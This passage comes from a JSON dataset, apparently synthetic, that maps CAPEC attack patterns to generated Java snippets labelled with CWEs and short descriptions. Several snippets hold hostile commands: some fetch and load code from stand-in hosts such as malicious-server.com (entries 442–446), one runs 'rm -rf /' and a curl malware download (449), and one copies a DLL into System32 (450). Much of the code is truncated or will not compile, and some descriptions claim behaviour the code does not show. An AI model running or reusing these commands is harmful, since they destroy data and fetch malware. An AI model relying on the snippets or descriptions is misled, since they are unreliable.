        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n        String message = dis.readUTF();\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the incoming request\n        if (message.equals(\"secret_message\")) {\n            dos.writeUTF(\"Access granted\");\n        } else {\n            dos.writeUTF(\"Access denied\");\n        }\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specifying the destination for the outgoing response\n        Socket outgoingSocket = new Socket(\"unknown_host\", 8080);\n        DataOutputStream outgoingDos = new DataOutputStream(outgoingSocket.getOutputStream());\n        outgoingDos.writeUTF(\"Response from server\");\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // Allowing non-endpoint access to the communication channel\n        ServerSocket externalSocket = new ServerSocket(9000);\n        Socket externalConnection = externalSocket.accept();\n        DataInputStream externalDis = new DataInputStream(externalConnection.getInputStream());\n        String externalMessage = externalDis.readUTF();\n        System.out.println(\"Received message from external actor: \" + externalMessage);\n        // CWE-673: External Influence of Sphere Definition\n        // Allowing external influence on the control sphere definition\n        if (externalMessage.equals(\"define_sphere\")) {\n            // Define control sphere based on external input\n            System.out.println(\"Control sphere defined by external actor\");\n        }\n        // CWE-205: Observable Behavioral Discrepancy\n        // Observable behavioral discrepancy in the server's response\n        if (message.equals(\"secret_message\")) {\n            Thread.sleep(5000);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC 'Channel Accessible by Non-Endpoint' by violating multiple CWEs. It includes improper verification of the source of an incoming request, incorrectly specifying the destination for an outgoing response, allowing non-endpoint access to the communication channel, external influence on the control sphere definition, and observable behavioral discrepancies in the server's response."
    },
    {
        "capec_id": "438",
        "code_snippet": "public class MaliciousHardwareDevice {\n    private static final String CONFIDENTIAL_INFO = \"TopSecretData\";\n    private static final String UNTRUSTED_COMPONENT = \"com.untrusted.vendor.Component\";\n\n    public MaliciousHardwareDevice() {\n        // Using an untrusted component that is not updateable\n        try {\n            Class<?> untrustedComponentClass = Class.forName(UNTRUSTED_COMPONENT);\n            Object untrustedComponent = untrustedComponentClass.newInstance();\n            // Use the untrusted component\n        } catch (Exception e) {\n            // Ignore the exception\n        }\n    }\n\n    public void accessConfidentialInfo() {\n        // Accessing confidential information without proper protection\n        System.out.println(CONFIDENTIAL_INFO);\n    }\n\n    public static void main(String[] args) {\n        // Releasing the product in non-release configuration\n        MaliciousHardwareDevice device = new MaliciousHardwareDevice();\n        device.accessConfidentialInfo();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious hardware device that embodies the CAPEC. It uses an untrusted component that is not updateable (CWE-1329), accesses confidential information without proper protection (CWE-1297), and is released in a non-release configuration (CWE-1269). The lack of technical documentation (CWE-1059) makes it difficult to identify and mitigate these vulnerabilities. The device's malicious functionality is hidden in the billions of transistors, making it hard to detect."
    },
    {
        "capec_id": "439",
        "code_snippet": "public class VulnerableProduct {\n    private String sensitiveInfo = \"top_secret\";\n    private ThirdPartyComponent vulnerableComponent;\n\n    public VulnerableProduct() {\n        vulnerableComponent = new ThirdPartyComponent(\"1.0\");\n    }\n\n    public void doSomething() {\n        System.out.println(\"Doing something...\");\n        vulnerableComponent.doSomethingElse();\n    }\n\n    public static void main(String[] args) {\n        VulnerableProduct product = new VulnerableProduct();\n        product.doSomething();\n    }\n}\n\nclass ThirdPartyComponent {\n    private String version;\n\n    public ThirdPartyComponent(String version) {\n        this.version = version;\n    }\n\n    public void doSomethingElse() {\n        if (version.equals(\"1.0\")) {\n            System.out.println(\"Using vulnerable version...\");\n            // Expose sensitive information\n            System.out.println(VulnerableProduct.sensitiveInfo);\n        } else {\n            System.out.println(\"Using secure version...\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of undermining the integrity of a product during distribution. The product, VulnerableProduct, uses a vulnerable third-party component, ThirdPartyComponent, which exposes sensitive information when used in a specific version. The product is released in a non-release configuration, exposing the sensitive information. The code also relies on an insufficiently trustworthy component and has a dependency on a vulnerable third-party component, making it vulnerable to attacks."
    },
    {
        "capec_id": "440",
        "code_snippet": "public class FirmwareUpdater {\n    private static final String FIRMWARE_VERSION = \"1.0\";\n    private static final String VULNERABLE_FIRMWARE_VERSION = \"0.9\";\n\n    public static void updateFirmware() {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        if (isFirmwareUpdatable()) {\n            // CWE-1328: Security Version Number Mutable to Older Versions\n            if (getFirmwareVersion().equals(VULNERABLE_FIRMWARE_VERSION)) {\n                // CWE-1248: Semiconductor Defects in Hardware Logic with Security-Sensitive Implications\n                if (hasSemiconductorDefects()) {\n                    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n                    if (isVoltageAndClockGlitchesDetected()) {\n                        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n                        injectErrorIntoRedundantBlock();\n                    }\n                }\n            }\n        }\n    }\n\n    private static boolean isFirmwareUpdatable() {\n        // TO DO: implement firmware updatable check\n        return true;\n    }\n\n    private static String getFirmwareVersion() {\n        // TO DO: implement firmware version retrieval\n        return VULNERABLE_FIRMWARE_VERSION;\n    }\n\n    private static boolean hasSemiconductorDefects() {\n        // TO DO: implement semiconductor defects check\n        return true;\n    }\n\n    private static boolean isVoltageAndClockGlitchesDetected() {\n        // TO DO: implement voltage and clock glitches detection\n        return true;\n    }\n\n    private static void injectErrorIntoRedundantBlock() {\n        // TO DO: implement error injection into redundant block\n        System.out.println(\"Error injected into redundant block\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable firmware update process that can be exploited by an adversary to inject errors into a redundant block, downgrade the firmware version, and take advantage of semiconductor defects and voltage and clock glitches. The code relies on components that are not updateable, has mutable security version numbers, and lacks proper protection against voltage and clock glitches."
    },
    {
        "capec_id": "441",
        "code_snippet": "public class MaliciousFirmwareUpdater {\n    private static String MALICIOUS_CODE = \"<malicious_code_here>\";\n    private static String FIRMWARE_UPDATE_URL = \"http://malicious-actor.com/update\";\n\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        // No access control checks, allowing unauthorized actors to update firmware\n        updateFirmware(FIRMWARE_UPDATE_URL);\n    }\n\n    private static void updateFirmware(String url) {\n        // CWE-506: Embedded Malicious Code\n        // Malicious code embedded in the firmware update\n        String firmwareUpdate = getFirmwareUpdateFromUrl(url);\n        executeMaliciousCode(firmwareUpdate);\n    }\n\n    private static String getFirmwareUpdateFromUrl(String url) {\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        // Malicious code replicates itself and spreads to other systems\n        String firmwareUpdate = \"\";\n        // Download firmware update from malicious URL\n        // ...\n        return firmwareUpdate;\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // CWE-1277: Firmware Not Updateable\n        // Firmware does not provide users with the ability to update or patch its firmware\n        // CWE-1229: Creation of Emergent Resource\n        // Malicious code creates a new resource that can be used by attackers\n        // Execute malicious code\n        // ...\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of installing malicious logic into a seemingly benign component of a fielded system. The code includes CWE-284: Improper Access Control, CWE-506: Embedded Malicious Code, CWE-509: Replicating Malicious Code (Virus or Worm), CWE-1277: Firmware Not Updateable, and CWE-1229: Creation of Emergent Resource. The malicious firmware updater downloads and executes malicious code from a malicious URL, replicates itself, and spreads to other systems, all while bypassing access control checks and creating new resources that can be used by attackers."
    },
    {
        "capec_id": "442",
        "code_snippet": "public class MaliciousSoftware {\n    public static void main(String[] args) {\n        // Benign functionality\n        System.out.println(\"Welcome to our software!\");\n        \n        // Hidden malicious logic\n        try {\n            String maliciousCode = \"http://malicious-server.com/malicious.jar\";\n            URL url = new URL(maliciousCode);\n            URLConnection conn = url.openConnection();\n            Object obj = conn.getContent();\n            \n            // Download and execute malicious code without integrity check\n            ClassLoader loader = new URLClassLoader(new URL[] { url });\n            Class<?> clazz = loader.loadClass(\"MaliciousClass\");\n            clazz.getMethod(\"execute\").invoke(obj);\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC pattern of adding malicious logic to benign software. The software appears to be normal, but it downloads and executes malicious code from a remote location without verifying its integrity, which is a CWE-494 violation. The malicious code can be a Trojan Horse (CWE-507) that replicates itself (CWE-509) or remains non-replicating (CWE-508), and it can also contain embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "443",
        "code_snippet": "public class MaliciousCodeInjector {\n    public static void main(String[] args) {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class Malicious { public static void main(String[] args) { System.out.println('Malicious code executed'); }}\";\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious-server.com/malicious-code.jar\");\n            URLClassLoader urlClassLoader = new URLClassLoader(new URL[] { url });\n            Class<?> maliciousClass = urlClassLoader.loadClass(\"Malicious\");\n            Object maliciousInstance = maliciousClass.newInstance();\n            // CWE-671: Lack of Administrator Control over Security\n            System.setSecurityManager(null);\n            // CWE-277: Insecure Inherited Permissions\n            File maliciousFile = new File(\"malicious-file.txt\");\n            maliciousFile.setReadable(true, false);\n            maliciousFile.setWritable(true, false);\n            // CWE-1229: Creation of Emergent Resource\n            Runtime.getRuntime().exec(\"touch malicious-resource.txt\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "A malicious developer injects malicious code into a Java application, which downloads and executes code from a remote location without integrity checks, sets insecure permissions, and creates emergent resources, all while bypassing security controls."
    },
    {
        "capec_id": "444",
        "code_snippet": "public class MaliciousCompilerOptimizer {\n    public static void main(String[] args) {\n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        // The compiler optimizes away the security check\n        if (System.getProperty(\\",
        "description": "This Java code snippet demonstrates a development alteration attack, where an adversary modifies the code during development to achieve a negative impact when the system is deployed. The code includes several CWEs, including CWE-733, CWE-506, CWE-497, and CWE-913, which can be leveraged by an attacker to execute malicious code, expose sensitive system information, and improperly control dynamically-managed code resources."
    },
    {
        "capec_id": "445",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class MaliciousCodeInjector {\n    public static void main(String[] args) throws Exception {\n        // CWE-506: Embedded Malicious Code\n        String maliciousCode = \"public class Malicious {\n            public static void main(String[] args) {\n                // malicious logic here\n                System.out.println(\"Malicious code executed\");\n            }\n        }\";\n\n        // CWE-913: Improper Control of Dynamically-Managed Code Resources\n        File maliciousFile = new File(\"Malicious.java\");\n        FileOutputStream fos = new FileOutputStream(maliciousFile);\n        fos.write(maliciousCode.getBytes());\n        fos.close();\n\n        // CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n        Runtime.getRuntime().exec(\"javac Malicious.java\");\n\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URLClassLoader loader = new URLClassLoader(new URL[] {new File(\".\").toURI().toURL()});\n        Class<?> maliciousClass = loader.loadClass(\"Malicious\");\n        Method mainMethod = maliciousClass.getMethod(\"main\", String[].class);\n        mainMethod.invoke(null, (Object) new String[] {});\n\n        // CWE-494: Download of Code Without Integrity Check\n        URL url = new URL(\"http://malicious-server.com/Malicious.class\");\n        URLClassLoader maliciousLoader = new URLClassLoader(new URL[] {url});\n        Class<?> downloadedClass = maliciousLoader.loadClass(\"Malicious\");\n        Method downloadedMainMethod = downloadedClass.getMethod(\"main\", String[].class);\n        downloadedMainMethod.invoke(null, (Object) new String[] {});\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a configuration management system to insert malicious logic into a software product's build, update, or deployment environment. It includes CWE-506 by embedding malicious code, CWE-913 by improperly controlling dynamically-managed code resources, CWE-1265 by unintentionally reinvoking non-reentrant code, CWE-829 by including functionality from an untrusted control sphere, and CWE-494 by downloading code without integrity checks."
    },
    {
        "capec_id": "446",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableProduct {\n    public static void main(String[] args) throws IOException {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\"http://untrusted-source.com/malicious-library.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] { url });\n        Class<?> maliciousClass = loader.loadClass(\"MaliciousClass\");\n        Object maliciousObject = maliciousClass.newInstance();\n\n        // CWE-506: Embedded Malicious Code\n        maliciousObject.getClass().getMethod(\"executeMaliciousCode\").invoke(maliciousObject);\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        org.vulnerable.library.VulnerableClass vulnerableClass = new org.vulnerable.library.VulnerableClass();\n        vulnerableClass.vulnerableMethod();\n\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        org.untrusted.component.UntrustedComponent untrustedComponent = new org.untrusted.component.UntrustedComponent();\n        untrustedComponent.untrustedMethod();\n\n        // CWE-1103: Use of Platform-Dependent Third Party Components\n        org.platformdependent.library.PlatformDependentClass platformDependentClass = new org.platformdependent.library.PlatformDependentClass();\n        platformDependentClass.platformDependentMethod();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable product that includes insecure third-party components, which can lead to supply chain attacks. It imports a malicious library from an untrusted source, uses a vulnerable third-party component, relies on an insufficiently trustworthy component, and includes platform-dependent third-party components."
    },
    {
        "capec_id": "447",
        "code_snippet": "public class VulnerableSystem {\n    private static final String SENSITIVE_INFO = \"secret_key\";\n    \n    public void performCriticalOperation() {\n        // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n        if (System.getProperty(\"os.arch\").equals(\"x86\")) {\n            // Security-critical code removed or modified by processor optimization\n            return;\n        }\n        \n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        System.out.println(SENSITIVE_INFO);\n        \n        // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        if (System.getProperty(\"java.vm.name\").equals(\"Java HotSpot(TM) 64-Bit Server VM\")) {\n            // Security-critical code removed or modified by compiler optimization\n            return;\n        }\n        \n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        String userInput = getClientInput();\n        if (userInput.equals(\"admin\")) {\n            // Client-side enforcement of server-side security\n            grantAdminAccess();\n        }\n        \n        // CWE-657: Violation of Secure Design Principles\n        // Insecure direct object reference\n        String filename = \"confidential_data.txt\";\n        File file = new File(filename);\n        if (file.exists()) {\n            System.out.println(\"File exists\");\n        }\n    }\n    \n    private String getClientInput() {\n        // Simulating client input\n        return \"admin\";\n    }\n    \n    private void grantAdminAccess() {\n        // Granting admin access\n        System.out.println(\"Admin access granted\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable system design that embodies the CAPEC description. It includes multiple CWEs, such as processor optimization removal of security-critical code, exposure of sensitive system information, compiler optimization removal of security-critical code, client-side enforcement of server-side security, and violation of secure design principles. These vulnerabilities can be leveraged by an adversary to achieve a negative impact on the system."
    },
    {
        "capec_id": "448",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.Path;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        try {\n            // CWE-506: Embedded Malicious Code\n            String maliciousCode = \"\\x90\\x90\\x90\\x90\"; // NOP sled\n            byte[] maliciousBytes = maliciousCode.getBytes();\n            \n            // CWE-426: Untrusted Search Path\n            String dllPath = System.getProperty(\"user.home\") + \"\\\\malicious_dll.dll\";\n            File dllFile = new File(dllPath);\n            if (!dllFile.exists()) {\n                dllFile.createNewFile();\n            }\n            \n            // CWE-1102: Reliance on Machine-Dependent Data Representation\n            Files.write(Paths.get(dllPath), maliciousBytes);\n            \n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            Runtime.getRuntime().exec(\"rundll32.exe \" + dllPath);\n            \n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(System.getProperty(\"os.name\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of tampering with a DLL and embedding a computer virus into gaps between legitimate machine instructions. It uses CWE-506 to embed malicious code, CWE-426 to use an untrusted search path, CWE-1102 to rely on machine-dependent data representation, CWE-509 to replicate the malicious code, and CWE-497 to expose sensitive system information."
    },
    {
        "capec_id": "449",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class MalwareInfection {\n    public static void main(String[] args) {\n        // CWE-507: Trojan Horse\n        String maliciousCode = \"rm -rf /\";\n        try {\n            Runtime.getRuntime().exec(maliciousCode);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-506: Embedded Malicious Code\n        String embeddedMalware = \"curl http://malicious-server.com/malware.exe\";\n        try {\n            Runtime.getRuntime().exec(embeddedMalware);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-589: Call to Non-ubiquitous API\n        try {\n            File file = new File(\"AUX:\\\\test.txt\");\n            file.createNewFile();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-67: Improper Handling of Windows Device Names\n        String pathname = \"CON:\\\\test.txt\";\n        File file = new File(pathname);\n        if (file.exists()) {\n            System.out.println(\"File exists\");\n        } else {\n            System.out.println(\"File does not exist\");\n        }\n\n        // CWE-1277: Firmware Not Updateable\n        // Assume firmwareUpdate() is a method that is not implemented\n        firmwareUpdate();\n    }\n\n    private static void firmwareUpdate() {\n        // This method is not implemented, making the firmware not updateable\n    }\n}",
        "description": "This Java code snippet demonstrates a malware infection into product software, which is a deprecated CAPEC pattern. It includes various CWEs such as Trojan Horse, Embedded Malicious Code, Call to Non-ubiquitous API, Improper Handling of Windows Device Names, and Firmware Not Updateable. The code executes malicious commands, embeds malware, calls non-ubiquitous APIs, handles Windows device names improperly, and lacks firmware updateability."
    },
    {
        "capec_id": "450",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class MaliciousDLL {\n    public static void main(String[] args) {\n        // CWE-507: Trojan Horse - Hidden malicious code\n        try {\n            Runtime.getRuntime().exec(\"cmd /c start malicious.bat\");\n        } catch (IOException e) {}\n\n        // CWE-506: Embedded Malicious Code - Malicious code embedded in the DLL\n        String maliciousCode = \"public class Malicious { public static void main(String[] args) { while(true) { System.out.println('Malicious code running...'); } }\";\n        try {\n            Runtime.getRuntime().exec(\"javac\", maliciousCode);\n        } catch (IOException e) {}\n\n        // CWE-426: Untrusted Search Path - Searching for resources using an externally-supplied search path\n        String searchPath = \"C:\\\\MaliciousDLL\\\\\";\n        System.setProperty(\"java.library.path\", searchPath);\n        System.loadLibrary(\"malicious\");\n\n        // CWE-67: Improper Handling of Windows Device Names - Handling Windows device names\n        File file = new File(\"AUX:\\\\malicious.dll\");\n        if (file.exists()) {\n            System.out.println(\"Malicious DLL found!\");\n        }\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm) - Replicating malicious code\n        try {\n            Runtime.getRuntime().exec(\"cmd /c copy malicious.dll C:\\\\Windows\\\\System32\\\\\");\n        } catch (IOException e) {}\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern of embedding a virus into a DLL. It includes various CWEs such as Trojan Horse, Embedded Malicious Code, Untrusted Search Path, Improper Handling of Windows Device Names, and Replicating Malicious Code. The code executes malicious commands, loads malicious libraries, and replicates itself to other systems."
    },
    {
        "capec_id": "451",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class MalwareInfection {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"malicious-domain.com\");\n            String firmwareVersion = getFirmwareVersion();\n            if (firmwareVersion == null || !firmwareVersion.startsWith(\"latest\")) {\n                // Update firmware using non-ubiquitous API\n                updateFirmwareUsingNonUbiquitousAPI();\n            }\n        } catch (UnknownHostException e) {\n            // Authentication bypass issue\n            authenticateUsingWeakMethod();\n        }\n    }\n\n    private static String getFirmwareVersion() {\n        // Return null to simulate firmware not updateable\n        return null;\n    }\n\n    private static void updateFirmwareUsingNonUbiquitousAPI() {\n        // Call to non-ubiquitous API\n        System.load(\"non-ubiquitous-api.so\");\n    }\n\n    private static void authenticateUsingWeakMethod() {\n        // Trojan horse - hidden authentication bypass code\n        System.out.println(\"Authenticated using weak method\");\n    }\n}",
        "description": "This Java code snippet demonstrates a malware infection into product software, which is a deprecated CAPEC. It includes CWEs such as reliance on DNS lookups in a security decision (CWE-247), call to non-ubiquitous API (CWE-589), firmware not updateable (CWE-1277), authentication bypass issues (CWE-592), and Trojan horse (CWE-507). The code attempts to update firmware using a non-ubiquitous API, simulates firmware not being updateable, and includes a hidden authentication bypass code."
    },
    {
        "capec_id": "452",
        "code_snippet": "public class MaliciousHardwareController {\n    private static final int DEBUG_MODE = 1;\n    private static final int NORMAL_MODE = 0;\n    private int mode = NORMAL_MODE;\n    private RegisterInterface registerInterface;\n\n    public MaliciousHardwareController(RegisterInterface registerInterface) {\n        this.registerInterface = registerInterface;\n    }\n\n    public void setMode(int mode) {\n        this.mode = mode;\n        if (mode == DEBUG_MODE) {\n            // Activate test or debug logic at runtime\n            registerInterface.setRegisterValue(0x1234, 0x0001);\n        }\n    }\n\n    public void executeCommand(String command) {\n        if (mode == DEBUG_MODE) {\n            // Replicating malicious code\n            String virusCode = \"\";\n            try {\n                virusCode = readFromExternalSource();\n            } catch (Exception e) {\n                // Handle exception\n            }\n            executeVirusCode(virusCode);\n        } else {\n            // Normal operation\n            registerInterface.executeCommand(command);\n        }\n    }\n\n    private String readFromExternalSource() {\n        // Read malicious code from external source\n        return \"\";\n    }\n\n    private void executeVirusCode(String virusCode) {\n        // Execute malicious code\n    }\n}\n\ninterface RegisterInterface {\n    void setRegisterValue(int address, int value);\n    void executeCommand(String command);\n}\n",
        "description": "This Java code snippet demonstrates a malicious hardware controller that can be activated in debug mode, allowing an adversary to execute malicious code and replicate it to other systems. The code uses a RegisterInterface to access hardware registers, which can be vulnerable to improper access control. The debug mode can be activated at runtime, allowing an adversary to alter the intended behavior of the system and leak sensitive data."
    },
    {
        "capec_id": "453",
        "code_snippet": "public class MaliciousHardwareController {\n    private boolean isAdmin = false;\n    private String authenticationToken = \"\";\n\n    public MaliciousHardwareController(String token) {\n        this.authenticationToken = token;\n    }\n\n    public void injectErrorIntoRedundantBlock() {\n        // CWE-1334: Unauthorized Error Injection\n        if (!isAdmin) {\n            // inject error into redundant block\n            System.out.println(\"Error injected into redundant block\");\n        }\n    }\n\n    public void authenticate() {\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedToken = \"captured_token\";\n        if (capturedToken.equals(this.authenticationToken)) {\n            isAdmin = true;\n            System.out.println(\"Authentication bypassed\");\n        }\n    }\n\n    public void runMaliciousCode() {\n        // CWE-506: Embedded Malicious Code\n        if (isAdmin) {\n            // execute malicious code\n            System.out.println(\"Malicious code executed\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern of malicious logic insertion into product hardware. It includes CWE-506: Embedded Malicious Code, CWE-1334: Unauthorized Error Injection, and CWE-294: Authentication Bypass by Capture-replay. The code allows an unauthorized user to inject errors into a redundant block, bypass authentication, and execute malicious code."
    },
    {
        "capec_id": "454",
        "code_snippet": "public class MaliciousHardware { \n private static final String MALICIOUS_CODE = \"<malicious_code_here>\"; \n \n public MaliciousHardware() { \n try { \n // Undocumented feature to execute malicious code \n Runtime.getRuntime().exec(MALICIOUS_CODE); \n } catch (IOException e) { \n // Failure to provide confidentiality for stored data \n System.out.println(\"Error: \" + e.getMessage()); \n } \n } \n \n public static void main(String[] args) { \n MaliciousHardware maliciousHardware = new MaliciousHardware(); \n } \n }",
        "description": "This Java code snippet demonstrates a malicious hardware component that includes undocumented features and executes malicious code. The code relies on a component that cannot be updated or patched, making it vulnerable to attacks. It also fails to provide confidentiality for stored data and includes embedded malicious code."
    },
    {
        "capec_id": "455",
        "code_snippet": "public class MaliciousHardwareController {\n    private boolean isAuthorized = false;\n    private int redundantBlockCount = 3;\n    private int[] redundantBlocks = new int[redundantBlockCount];\n\n    public void injectError(int blockIndex, int errorCode) {\n        if (!isAuthorized) {\n            // CWE-506: Embedded Malicious Code\n            redundantBlocks[blockIndex] = errorCode;\n            System.out.println(\"Error injected into block \" + blockIndex);\n        } else {\n            System.out.println(\"Authorization failed\");\n        }\n    }\n\n    public void operateInRedundantMode() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        for (int i = 0; i < redundantBlockCount; i++) {\n            if (redundantBlocks[i] != 0) {\n                System.out.println(\"System operating in degraded mode\");\n                break;\n            }\n        }\n    }\n\n    public void storeData(int data) {\n        // CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n        // CWE-218: DEPRECATED: Failure to provide confidentiality for stored data\n        // CWE-592: DEPRECATED: Authentication Bypass Issues\n        // No secure data storage mechanism implemented\n        System.out.println(\"Data stored: \" + data);\n    }\n}",
        "description": "Java code snippet demonstrating a malicious hardware controller that injects errors into redundant blocks, degrading the system's redundancy, and lacks secure data storage mechanisms."
    },
    {
        "capec_id": "456",
        "code_snippet": "public class MaliciousMemoryAccess {\n    public static void main(String[] args) {\n        // CWE-1257: Improper Access Control Applied to Mirrored or Aliased Memory Regions\n        int[] aliasedMemoryRegion = new int[10];\n        int[] mirroredMemoryRegion = aliasedMemoryRegion;\n        mirroredMemoryRegion[0] = 123; // Accessing aliased memory region\n\n        // CWE-1260: Improper Handling of Overlap Between Protected Memory Ranges\n        protectedMemoryRange(0x1000, 0x2000); // Overlapping protected memory range\n        protectedMemoryRange(0x1500, 0x2500); // Overlapping protected memory range\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] bootCode = new byte[1024];\n        loadBootCodeIntoVolatileMemory(bootCode); // No access control for volatile memory\n\n        // CWE-1312: Missing Protection for Mirrored Regions in On-Chip Fabric Firewall\n        onChipFabricFirewall(0x3000, 0x4000); // Firewall only protects main addressed region\n        mirroredMemoryRegionAccess(0x3500); // Accessing mirrored memory region\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        fabricAddressMap(0x5000, 0x6000, 0x5500, 0x6500); // Overlapping protected and unprotected regions\n    }\n\n    private static void protectedMemoryRange(int start, int end) {\n        // No access control or other protections for overlapping protected memory ranges\n    }\n\n    private static void loadBootCodeIntoVolatileMemory(byte[] bootCode) {\n        // No access control or other protections for volatile memory containing boot code\n    }\n\n    private static void onChipFabricFirewall(int start, int end) {\n        // Firewall only protects main addressed region, not mirrored memory regions\n    }\n\n    private static void mirroredMemoryRegionAccess(int address) {\n        // Accessing mirrored memory region without protection\n    }\n\n    private static void fabricAddressMap(int protectedStart, int protectedEnd, int unprotectedStart, int unprotectedEnd) {\n        // Overlapping protected and unprotected regions in fabric address map\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malicious logic into memory, focusing on systems already in operation. It incorporates CWEs 1257, 1260, 1274, 1312, and 1316, showcasing improper access control, overlapping protected memory ranges, and missing protections for mirrored regions and volatile memory."
    },
    {
        "capec_id": "457",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class USBMalware {\n    public static void main(String[] args) throws IOException {\n        // CWE-506: Embedded Malicious Code\n        String malwareCode = \"<malicious_code_here>\";\n        File usbDrive = new File(\"/mnt/usb\");\n        if (usbDrive.isDirectory()) {\n            File malwareFile = new File(usbDrive, \"malware.exe\");\n            FileOutputStream fos = new FileOutputStream(malwareFile);\n            fos.write(malwareCode.getBytes());\n            fos.close();\n        }\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter sensitive data: \");\n        String sensitiveData = scanner.nextLine();\n        System.out.println(\"Transmitting sensitive data in cleartext...\");\n        // Simulate transmission of sensitive data in cleartext\n        System.out.println(sensitiveData);\n\n        // CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Simulate exploitation of alternate hardware interface\n        // and physical side channels to steal sensitive information\n        System.out.println(\"Exploiting alternate hardware interface and physical side channels...\");\n        // Simulate electromagnetic fault injection attack\n        System.out.println(\"Performing electromagnetic fault injection attack...\");\n    }\n}",
        "description": "This Java code snippet demonstrates a USB malware that embeds malicious code, transmits sensitive information in cleartext, and exploits alternate hardware interfaces and physical side channels to steal sensitive information. The code simulates the transmission of sensitive data in cleartext and the exploitation of physical side channels to steal sensitive information. It also demonstrates the lack of protection mechanisms against electromagnetic fault injection attacks."
    },
    {
        "capec_id": "458",
